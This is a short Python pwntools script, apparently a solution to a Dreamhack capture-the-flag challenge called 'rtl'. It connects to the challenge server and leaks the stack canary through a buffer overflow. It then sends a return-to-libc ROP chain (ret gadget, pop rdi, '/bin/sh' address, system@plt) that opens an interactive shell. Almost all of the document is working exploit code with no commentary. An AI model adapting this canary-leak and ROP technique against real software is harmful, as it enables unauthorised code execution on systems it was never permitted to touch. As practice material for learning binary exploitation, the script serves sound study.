# python3
from pwn import *

context.arch = 'amd64'

def slog(byte_list): return success(''.join([f"{byte:02x}" for byte in byte_list])) 

e = ELF('./rtl')
p = remote('host3.dreamhack.games', 24547)

# [2] Exploit
system_plt = e.plt['system']

p.sendafter(b'Buf: ', b'A' * 0x38 + b'Z')
print(p.recvuntil(b'Z'))
cnry = b'\x00' + p.recvn(7)
#cnry = u64(b'\x00' + p.recvn(7))
#print(f'p64(cnry) : {p64(cnry)}')

#exploit 

system_plt = p64(e.plt['system'])
ret = p64(0x0000000000400285)
pop_rdi = p64(0x0000000000400853)
binsh = p64(0x400874)

payload = b'A' *0x38
#payload += p64(cnry)
payload += cnry
payload += b'B' * 0x8 
payload += ret 
payload += pop_rdi
payload += binsh
payload += system_plt

print(payload)
p.sendafter(b'Buf: ', payload)


p.interactive()









